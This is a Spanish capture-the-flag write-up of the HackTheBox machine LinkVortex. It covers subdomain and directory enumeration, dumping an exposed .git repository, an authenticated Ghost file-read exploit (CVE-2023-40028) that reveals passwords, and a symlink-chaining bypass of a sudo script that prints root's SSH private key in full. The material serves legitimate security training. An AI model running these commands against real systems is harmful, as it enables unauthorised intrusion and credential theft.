---
title: Writeup LinkVortex HTB
author: rabb1t
date: 2025-04-12
categories: [HackTheBox, Writeup, Machines, Linux]
tags: [Arbitrary-File-Read, CVE-2023-40028, .git, symbolic-link, Ghost-Blog, subdomains-enumeration, Code-analyse]
math: false
mermaid: false
image:
  path: https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png
  width: 180
  height: 180
---
Esta máquina cuenta con un servicio web sencillo el cual debemos enumerar para identificar un directorio que contiene un servicio de bloggeo (Ghost), la cual a su vez tiene una vulnerabilidad Local File Inclusión que requiere autenticación. Enumeramos subdominios e identificamos uno nuevo en el cual también debemos enumerar directorios, obteniendo un recurso de Git donde podemos extraer todos los objetos. Dentro de este recurso identificamos credenciales para el usuario administrador de Ghost con las cuales, podemos ejecutar un exploit que nos permita leer archivos internos de la máquina víctima. Usando la vulnerabilidad LFI identificamos un usuario llamado Bob que está asociado a SSH, y reutilizando las credenciales del usuario administrador en el sitio Ghost, procedemos a iniciar sesión por SSH con este último usuario. Para escalar privilegios contamos con los permisos para ejecutar un script como root. El script comprueba enlaces simbólico y si apunta a rutas críticas como "/etc" o "/root". Nos aprovechamos de esto ya que manipulando enlaces simbólicos y genenando un bypass, logramos leer archivos sensibles como la id_rsa del usuario root.


## Índice
- [Información básica de la máquina](#máquina-linkvortex)
- [Herramientas y recursos empleados](#herramientas-y-recursos-empleados)
- [Enumeración](#enumeración)
- [Explotando la vulnerabilidad LFI en el Ghost](#explotando-la-vulnerabilidad-lfi-en-el-ghost)
- [Escalando privilegios](#escalando-privilegios)
  - [Analizando código](#analizando-código)

## Máquina linkvortex

| IP         |10.10.11.47|
|--------------|------------|
| OS       | Linux      |
| Dificultad   | Fácil      |
| Creador    | 0xyassine  |

## Herramientas y recursos empleados

- Herramientas
  - nmap
  - gobuster
  - wfuzz
  - [GitHack.py](https://github.com/lijiejie/GitHack)
- Recursos
  - SecLists

----

## Enumeración
Comenzamos realizando un escaneo con `nmap` a la máquina víctima:

```shell
# Nmap 7.94SVN scan initiated Sun Apr  6 00:58:58 2025 as: nmap -p- -sCV -sS --min-rate 5000 -Pn --open -n -vvv -oN scope.txt 10.10.11.47
Nmap scan report for 10.10.11.47
Host is up, received user-set (0.48s latency).
Scanned at 2025-04-06 00:58:59 EDT for 40s
Not shown: 53494 closed tcp ports (reset), 12039 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  6 00:59:39 2025 -- 1 IP address (1 host up) scanned in 41.36 seconds

```

En el escaneo, no obtenemos gran información más allá de los puertos abiertos, así que incluí el dominio `linkvortex.htb` en el archivo `/etc/hosts`

Procedí a enumerar directorios en el servicio web con gobuster:
```shell
rabb1t@hold:~$ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 25 -u 'http://linkvortex.htb/' -f -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://linkvortex.htb/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about/               (Status: 200) [Size: 8284]
/rss/                 (Status: 200) [Size: 26682]
/feed/                (Status: 200) [Size: 26682]
/About/               (Status: 200) [Size: 8284]
/RSS/                 (Status: 200) [Size: 26682]
/private/             (Status: 200) [Size: 12148]
/unsubscribe/         (Status: 400) [Size: 24]
/cpu/                 (Status: 200) [Size: 15472]
/Rss/                 (Status: 200) [Size: 26682]
/ram/                 (Status: 200) [Size: 14746]
/ghost/               (Status: 200) [Size: 3787]
/psu/                 (Status: 200) [Size: 15163]
/Private/             (Status: 200) [Size: 12148]
/Feed/                (Status: 200) [Size: 26682]
/Ghost/               (Status: 200) [Size: 3787]
/RAM/                 (Status: 200) [Size: 14746]
/vga/                 (Status: 200) [Size: 15231]
/CPU/                 (Status: 200) [Size: 15472]
/VGA/                 (Status: 200) [Size: 15231]
/AMP/                 (Status: 200) [Size: 12148]
/ABOUT/               (Status: 200) [Size: 8284]
/47117/               (Status: 502) [Size: 341]
/cmos/                (Status: 200) [Size: 15489]
/server-status/       (Status: 403) [Size: 199]
/Ram/                 (Status: 200) [Size: 14746]
/Unsubscribe/         (Status: 400) [Size: 24]
/unSubscribe/         (Status: 400) [Size: 24]
/amp/                 (Status: 200) [Size: 12148]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```


Identifiqué el recurso `/ghost` el cual procedí a acceder desde el navegador. Además usé la extensión `Wappalyzer` para observar las tecnologías empleadas en el sitio.


![Web linkvortex](/assets/favicon/2025-04-12/linkvortex1.png)
_Figure 1. Identificación de tecnologías con Wappalyzer._

Podemos observar que nos enfrentamos a un CMS llamado "Ghost" que está en la versión 5.58

Así que procedí a buscar en internet algún exploit para esa versión de Ghost e identifiqué un Arbitrary File Read que requiere autenticación
[CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028).


Debido a que requiero autenticación para leer archivos del sistema, proseguí con la enumeración.

Anteriormente usé gobuster para identificar subdominios pero no me obtuve ninguno valido, así que procedí a hacerlo con `wfuzz`.
```shell
rabb1t@hold:~$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 10 -H "Host:FUZZ.linkvortex.htb" --hc 301 http://linkvortex.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                      
=====================================================================

000000019:   200        115 L    255 W      2538 Ch     "dev"
000009532:   400        8 L      27 W       226 Ch      "#www"
000010581:   400        8 L      27 W       226 Ch      "#mail"
000047706:   400        8 L      27 W       226 Ch      "#smtp"                 
000103135:   400        8 L      27 W       226 Ch      "#pop3"                                                                                      
Total time: 0
Processed Requests: 114441
Filtered Requests: 114436
Requests/sec.: 0
```

Con esta herramienta, obtuve un nuevo subdominio valido, `dev.linkvortex.htb` el cual procedí a incluir en el archivo `/etc/hosts`.



Ingresé desde el navegador a "http://dev.linkvortex.htb" y pude observar que el sitio no contenía nada más que una página avisando un pronto lanzamiento.
![Web linkvortex](/assets/favicon/2025-04-12/linkvortex2.png)
_Figure 2. Sitio en desarrollo._

Así que procedí a enumerar directorios y no hubo frutos...

```shell
rabb1t@hold:~$ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 25 -u 'http://dev.linkvortex.htb/' -f -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.linkvortex.htb/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 199]
/icons/               (Status: 403) [Size: 199]
/server-status/       (Status: 403) [Size: 199]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```


También procedí a enumerar archivos o rutas comunes e identifiqué algo interesante.
```shell
rabb1t@hold:~$ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 25 -u 'http://dev.linkvortex.htb/' -f -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.linkvortex.htb/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess/           (Status: 403) [Size: 199]
/.hta/                (Status: 403) [Size: 199]
/.git/logs//          (Status: 200) [Size: 868]
/.git/                (Status: 200) [Size: 2796]
/.htpasswd/           (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/cgi-bin//            (Status: 403) [Size: 199]
/icons/               (Status: 403) [Size: 199]
/server-status/       (Status: 403) [Size: 199]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```

Obtenemos un directorio `/.git`, así que procedí a extraer todos los objetos con GitHack:

```shell
rabb1t@hold:~$ python GitHack.py http://dev.linkvortex.htb/.git
[+] Download and parse index file ...
[+] .editorconfig
[+] .gitattributes
[+] .github/AUTO_ASSIGN
[+] .github/CONTRIBUTING.md
[+] .github/FUNDING.yml
[+] .github/ISSUE_TEMPLATE/bug-report.yml
[+] .github/ISSUE_TEMPLATE/config.yml
[+] .github/PULL_REQUEST_TEMPLATE.md
[+] .github/SUPPORT.md
[+] .github/actions/restore-cache/action.yml
[+] .github/codecov.yml
[+] .github/hooks/pre-commit
[+] .github/scripts/dev.js
[+] .github/workflows/auto-assign.yml
[+] .github/workflows/browser-tests.yml
[+] .github/workflows/ci.yml
[+] .github/workflows/create-release-branch.yml
[+] .github/workflows/custom-build.yml
[+] .github/workflows/i18n.yml
[+] .github/workflows/label-actions.yml
[+] .github/workflows/migration-review.yml
[+] .github/workflows/stale.yml
[+] .gitignore
[+] .gitmodules
[+] .vscode/launch.json
[+] .vscode/settings.json
[+] Dockerfile.ghost
[+] LICENSE
[+] PRIVACY.md
[+] README.md
[+] SECURITY.md
[+] apps/admin-x-settings/.eslintrc.cjs
[+] apps/admin-x-settings/.storybook/main.tsx
[+] apps/admin-x-settings/.storybook/preview.tsx
[+] apps/admin-x-settings/.yarnrc
[+] apps/admin-x-settings/README.md
[+] apps/admin-x-settings/index.html
[+] apps/admin-x-settings/package.json
[+] apps/admin-x-settings/playwright.config.ts
[+] apps/admin-x-settings/postcss.config.cjs
[+] apps/admin-x-settings/public/vite.svg
[+] apps/admin-x-settings/src/App.tsx
[+] apps/admin-x-settings/src/admin-x-ds/Boilerplate.stories.tsx
[+] apps/admin-x-settings/src/admin-x-ds/Boilerplate.tsx
[+] apps/admin-x-settings/src/admin-x-ds/assets/fonts/Inter.ttf
...
```

Una vez extraido los objetos, he usado `grep` para buscar recursivamente la palabra "pass" entre todos los archivos obtenidos, logrando identificar contraseñas de prueba.

```shell
rabb1t@hold:tools/dev.linkvortex.htb/ghost$ grep -r 'pass' . 2>/dev/null
./core/test/regression/api/admin/authentication.test.js:            const password = 'OctopiFociPilfer45';
./core/test/regression/api/admin/authentication.test.js:                        password,
./core/test/regression/api/admin/authentication.test.js:            await agent.loginAs(email, password);
./core/test/regression/api/admin/authentication.test.js:                        password: 'thisissupersafe',
./core/test/regression/api/admin/authentication.test.js:                        password: 'thisissupersafe',
./core/test/regression/api/admin/authentication.test.js:            const password = 'thisissupersafe';
./core/test/regression/api/admin/authentication.test.js:                        password,
./core/test/regression/api/admin/authentication.test.js:            await cleanAgent.loginAs(email, password);
./core/test/regression/api/admin/authentication.test.js:                        password: 'lel123456',
./core/test/regression/api/admin/authentication.test.js:                        password: '12345678910',
./core/test/regression/api/admin/authentication.test.js:                        password: '12345678910',
./core/test/regression/api/admin/authentication.test.js:        it('reset password', async function () {
```

En el sitio principal "http://linkvortex.htb" habían publicaciones de un usuario con nombre de usuario "admin", así que probé las contraseñas en el login del CMS de Ghost para ese usuario y logré iniciar sesión con las siguientes credenciales:
```shell
admin@linkvortex.htb:OctopiFociPilfer45
```

![Web linkvortex](/assets/favicon/2025-04-12/linkvortex3.png)


## Explotando la vulnerabilidad LFI en el Ghost

Ahora que tenemos credenciales, podemos recordar que en la enumeración identificamos una versión vulnerable del CMS Ghost a un Arbitrary File Read, así que usamos el exploit para enumerar recursos internos de la máquina. En este cso lo usamos para leer el contenido del archivo `/etc/passwd`.


```shell
rabb1t@hold:~$ ./exploit2.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

Intenté leer el contenido del archivo `/home/node/.ssh/id_rsa` pero no obtuve nada (parece ser un contenedor).
```shell
file> /home/node/.ssh/id_rsa
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
```

En este punto recordé que habúa un archivo identificado en los objetos `/.git`, así que procedí a leerlo:
```shell
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
file>
```

Podemos observar que existe un usuario llamado "bob" con una contraseña. Probé a utilizar la contraseña del usuario bob través de SSH y funcionó.


```shell
rabb1t@hold:~$ ssh bob@10.10.11.47
The authenticity of host '10.10.11.47 (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.47' (ED25519) to the list of known hosts.
bob@10.10.11.47's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Apr  6 04:10:21 2025 from 10.10.14.79
bob@linkvortex:~$
```

## Escalando privilegios

Una vez dentro de la máquina he procedido a revisar los permisos en sudoers. Podemos identificar que tenemos permisos para ejecutar `/opt/ghost/clean_symlink.sh` sobre cualquier imagen con extensión `png`. Además, existe la posibilidad de cambiar el valor de la variable de entorno `CHECK_CONTENT`.

```shell
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

### Analizando Código

He procedido a revisar el archivo sobre el cual tenemos permisos de ejecución como usuario root.
```shell
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

He procedido a explicar el código en el siguiente bloque.
```shell
#!/bin/bash

# Directorio donde se moverán los enlaces simbólicos sospechosos
QUAR_DIR="/var/quarantined"

# Si la variable de entorno CHECK_CONTENT no está definida, se establece en false
if [ -z $CHECK_CONTENT ]; then
  CHECK_CONTENT=false
fi

# archivo .png
LINK=$1

# Verifica que el argumento termine en .png
if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

# Verifica si el archivo es un enlace simbólico
if /usr/bin/sudo /usr/bin/test -L $LINK; then
  # Obtiene el nombre base del enlace (sin ruta)
  LINK_NAME=$(/usr/bin/basename $LINK)
  
  # Obtiene el destino al que apunta el enlace
  LINK_TARGET=$(/usr/bin/readlink $LINK)

  # Si el enlace apunta a una ruta que contiene "etc" o "root", se considera crítico
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)'; then
    # Se elimina el enlace simbólico por seguridad
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    # Si no es crítico, se mueve a la carpeta de cuarentena
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT; then
      # Si CHECK_CONTENT es true, se muestra el contenido del archivo apuntado (si existe)
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Evidenciando la falla, he procedido a concatenar dos enlaces simbólicos con el fin de eludir la detección de `(etc|root)` y posteriormente realizo la ejecución del script.

```shell
bob@linkvortex:~$ ln -s /root/root.txt test.txt
bob@linkvortex:~$ ln -s /home/bob/test.txt test.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ test.png ] , moving it to quarantine
Content:
bdbb0***********fe7c2c
```

Podemos desglosarlo un poco más y con la intención de leer el archivo "root.txt" del usurio root.

Creo un enlace simbólico llamado `test.txt` que apunta a `/root/root.txt`.
```shell
ln -s /root/root.txt test.txt
```


También creo otro enlace simbólico llamado `test.png` que apunta a `/home/bob/test.txt`, formando una cadena de enlaces:
test.png --> test.txt --> /root/root.txt
```shell
ln -s /home/bob/test.txt test.png
```

Ejecuto el script, pasando `*.png` como argumento y asignando `CHECK_CONTENT=true`.
```shell
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

El script recibe `test.png` como argumento y como termina en `.png`, se sigue ejecutando.

Verifica si `test.png` es un enlace simbólico, y lo es, así que continúa.

Obtenemos:
```shell
LINK_NAME=test.png
LINK_TARGET=/home/bob/test.txt (usando readlink)
```

Chequea si el LINK_TARGET contiene las palabras "etc" o "root":

```shell
echo "$LINK_TARGET" | grep -Eq '(etc|root)'
```

El valor es `/home/bob/test.txt` y mueve el enlace `test.png` a la carpeta `/var/quarantined`.

Como asigno `CHECK_CONTENT=true`, se intenta mostrar el contenido:

```shell
cat /var/quarantined/test.png
```

El script no está bien codificado para sanitizar los enlaces simbólicos, porque el destino directo del symlink (`/home/bob/test.txt`) no contiene “root” o "etc" en su ruta pero como `test.png` apunta en cadena hasta `/root/root.txt` y hemos asginado `CHECK_CONTENT=true`, se termina imprimiendo el contenido del archivo en `/root`.


Teniendo en cuenta lo anterior, procedí a obtener la información del archivo `id_rsa` del directorio `/root/.ssh/id_rsa` con el fin de posteriormente conectarnos a través de SSH.

```shell
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa test.testing
bob@linkvortex:~$ ln -s /home/bob/test.testing test.png
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ test.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
bob@linkvortex:~$
```

Procedí a conectarme a través de SSH y obtuve los máximos privilegios en la máquina.
```shell
rabb1t@hold:~$ ssh root@10.10.11.47 -i id_rsa
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:~#
```

¡Happy Hacking!